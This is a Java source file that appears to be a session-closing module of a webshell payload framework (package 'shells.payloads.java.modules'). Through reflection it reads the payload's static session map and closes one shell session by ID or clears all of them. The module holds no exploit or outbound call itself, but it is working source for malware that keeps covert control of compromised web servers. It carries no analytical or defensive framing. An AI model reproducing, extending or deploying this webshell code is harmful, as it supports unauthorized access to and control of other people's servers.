package shells.payloads.java.modules;

import java.lang.reflect.Field;
import java.util.Iterator;
import java.util.Map;

public class CloseModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[])value);
        }
        return value != null ? value.toString() : null;
    }

    private byte[] getBytes(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        return value instanceof byte[] ? (byte[])value : null;
    }

    private static Map getSessionMap(ClassLoader cl) throws Exception {
        Class payloadClass = Class.forName("shells.payloads.java.payload", false, cl);
        Field f = payloadClass.getDeclaredField("sessionMap");
        f.setAccessible(true);
        Object v = f.get((Object)null);
        return v instanceof Map ? (Map)v : null;
    }

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }

    public byte[] execute() {
        try {
            byte[] sidBytes = this.getBytes("sessionId");
            String sid = sidBytes != null ? new String(sidBytes) : null;
            String operation = this.getString("operation");
            Map sessionMap = null;

            try {
                sessionMap = getSessionMap(this.getClass().getClassLoader());
            } catch (Throwable ignored) {
            }

            if (sid != null) {
                if (sessionMap != null) {
                    Map s = (Map)sessionMap.remove(sid);
                    if (s != null) {
                        s.put("alive", Boolean.FALSE);
                    }
                } else if (this.session != null) {
                    Object st = this.session.get("sessionTable");
                    if (st instanceof Map) {
                        ((Map)st).put("alive", Boolean.FALSE);
                    }
                }

                return "ok".getBytes();
            } else if (operation != null && "clearup".equals(operation)) {
                if (sessionMap != null) {
                    Iterator it = sessionMap.values().iterator();

                    while(it.hasNext()) {
                        Object o = it.next();
                        if (o instanceof Map) {
                            ((Map)o).put("alive", Boolean.FALSE);
                        }
                    }

                    sessionMap.clear();
                    return "ok".getBytes();
                } else {
                    return "ok".getBytes();
                }
            } else {
                return "fail".getBytes();
            }
        } catch (Exception e) {
            return e.getMessage().getBytes();
        }
    }

    public String getModuleName() {
        return "close";
    }
}
